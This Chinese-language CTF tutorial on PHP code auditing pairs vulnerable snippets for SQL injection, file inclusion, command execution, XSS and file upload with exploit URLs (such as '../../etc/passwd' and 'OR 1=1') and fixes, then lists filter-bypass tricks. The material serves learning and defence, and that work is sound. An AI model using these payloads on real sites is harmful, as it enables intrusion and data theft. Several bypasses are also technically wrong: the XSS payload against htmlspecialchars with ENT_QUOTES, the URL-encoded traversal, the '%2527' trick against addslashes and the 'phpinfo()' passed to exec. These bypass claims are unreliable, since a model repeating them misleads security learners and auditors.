在CTF（Capture The Flag）比赛中，PHP代码审计主要是为了发现和利用代码中的漏洞，常见的漏洞包括SQL注入、文件包含、命令执行、XSS（跨站脚本攻击）和文件上传等。下面是一些常见的PHP代码示例及其漏洞利用方式：

### 1. SQL注入 (SQL Injection)
SQL注入是指通过把SQL命令插入到Web表单提交或页面请求的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令。

#### 漏洞代码示例：
```php
<?php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);
?>
```

#### 利用方式：
如果没有进行参数化查询，攻击者可以通过传递恶意输入来操纵SQL查询，例如：
```
http://example.com/page.php?id=1 OR 1=1
```

#### 修复方法：
使用准备语句（Prepared Statements）进行参数化查询：
```php
<?php
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();
?>
```

### 2. 文件包含 (File Inclusion)
文件包含漏洞允许攻击者包含远程或本地的文件，从而执行任意代码。

#### 漏洞代码示例：
```php
<?php
$file = $_GET['file'];
include($file);
?>
```

#### 利用方式：
通过传递恶意输入，攻击者可以包含敏感文件或恶意脚本，例如：
```
http://example.com/page.php?file=../../../../etc/passwd
```

#### 修复方法：
严格限制可包含的文件，并使用白名单：
```php
<?php
$whitelist = ['page1.php', 'page2.php'];
$file = $_GET['file'];
if (in_array($file, $whitelist)) {
    include($file);
} else {
    echo "Invalid file!";
}
?>
```

### 3. 命令执行 (Command Execution)
命令执行漏洞允许攻击者在服务器上执行任意命令。

#### 漏洞代码示例：
```php
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>
```

#### 利用方式：
通过传递恶意输入，攻击者可以执行任意命令，例如：
```
http://example.com/page.php?cmd=ls
```

#### 修复方法：
避免使用用户输入直接执行系统命令，或者对输入进行严格的过滤和验证：
```php
<?php
$allowed_commands = ['ls', 'whoami'];
$cmd = $_GET['cmd'];
if (in_array($cmd, $allowed_commands)) {
    system($cmd);
} else {
    echo "Invalid command!";
}
?>
```

### 4. 跨站脚本攻击 (XSS)
XSS漏洞允许攻击者向网页注入恶意脚本，从而在其他用户的浏览器中执行。

#### 漏洞代码示例：
```php
<?php
echo $_GET['name'];
?>
```

#### 利用方式：
通过传递恶意输入，攻击者可以注入恶意脚本，例如：
```
http://example.com/page.php?name=<script>alert('XSS');</script>
```

#### 修复方法：
对所有输出进行HTML实体编码：
```php
<?php
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```

### 5. 文件上传 (File Upload)
文件上传漏洞允许攻击者上传并执行恶意文件。

#### 漏洞代码示例：
```php
<?php
if (move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name'])) {
    echo "File uploaded successfully!";
}
?>
```

#### 利用方式：
攻击者可以上传包含恶意代码的PHP文件，然后通过访问该文件执行代码。

#### 修复方法：
限制上传的文件类型并验证文件内容：
```php
<?php
$allowed_types = ['image/jpeg', 'image/png'];
if (in_array($_FILES['file']['type'], $allowed_types) && getimagesize($_FILES['file']['tmp_name'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . basename($_FILES['file']['name']));
    echo "File uploaded successfully!";
} else {
    echo "Invalid file type!";
}
?>
```

这些示例展示了在CTF比赛中常见的PHP代码审计场景及其利用方式和修复方法。通过学习这些漏洞，参赛者可以提高对代码安全的理解，并能够在实际比赛中更好地发现和利用漏洞。

# 绕过技巧

在CTF比赛中，绕过PHP安全机制和漏洞修复措施是常见的挑战。以下是一些常见的PHP绕过技巧和示例：

### 1. 绕过字符串过滤

#### 示例1：SQL注入绕过
即使应用了简单的字符串过滤，攻击者仍然可以利用字符编码或注释来绕过过滤。

##### 漏洞代码：
```php
<?php
$id = str_replace("'", "", $_GET['id']);  // 移除单引号
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
?>
```

##### 绕过方法：
利用SQL注释：
```
http://example.com/page.php?id=1'--+
```

#### 示例2：文件包含绕过
攻击者可以利用字符编码或路径截断来绕过文件路径过滤。

##### 漏洞代码：
```php
<?php
$file = str_replace("../", "", $_GET['file']);  // 移除目录遍历字符
include($file);
?>
```

##### 绕过方法：
利用字符编码：
```
http://example.com/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

### 2. 绕过空格过滤

#### 示例：命令执行绕过
通过替换空格字符来绕过过滤，例如使用换行符（%0A）或制表符（%09）。

##### 漏洞代码：
```php
<?php
$cmd = str_replace(" ", "", $_GET['cmd']);  // 移除空格
system($cmd);
?>
```

##### 绕过方法：
利用换行符或制表符：
```
http://example.com/page.php?cmd=ls%0A-l
```

### 3. 绕过文件上传限制

#### 示例：文件上传绕过
通过伪造文件类型或双重扩展名来绕过文件类型检查。

##### 漏洞代码：
```php
<?php
$allowed_types = ['image/jpeg', 'image/png'];
if (in_array($_FILES['file']['type'], $allowed_types)) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
?>
```

##### 绕过方法：
通过双重扩展名：
```
上传文件名：shell.php.jpg
```
或者伪造MIME类型：
```
Content-Type: image/jpeg
```

### 4. 绕过输入验证

#### 示例：跨站脚本（XSS）绕过
利用字符编码或事件属性来绕过输入验证。

##### 漏洞代码：
```php
<?php
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```

##### 绕过方法：
利用事件属性：
```
http://example.com/page.php?name=" onmouseover="alert('XSS')
```

### 5. 绕过特殊字符过滤

#### 示例：SQL注入绕过
通过字符编码或使用SQL函数来绕过特殊字符过滤。

##### 漏洞代码：
```php
<?php
$id = addslashes($_GET['id']);  // 转义特殊字符
$query = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
?>
```

##### 绕过方法：
利用字符编码：
```
http://example.com/page.php?id=%2527%2520OR%25201=1--+
```

### 6. 绕过函数限制

#### 示例：禁用函数绕过
通过利用其它函数或特定环境来绕过禁用函数。

##### 漏洞代码：
```php
<?php
if (function_exists('exec')) {
    exec($_GET['cmd']);
} else {
    echo "Function not available";
}
?>
```

##### 绕过方法：
利用其它可用的函数：
```php
http://example.com/page.php?cmd=phpinfo()
```

### 总结
以上是一些常见的PHP绕过技巧和示例。在CTF比赛中，选手需要灵活运用这些技巧来绕过防御机制，发现并利用代码中的漏洞。同时，开发者应对代码进行严格的输入验证和输出编码，使用安全的编程实践，减少代码漏洞的产生。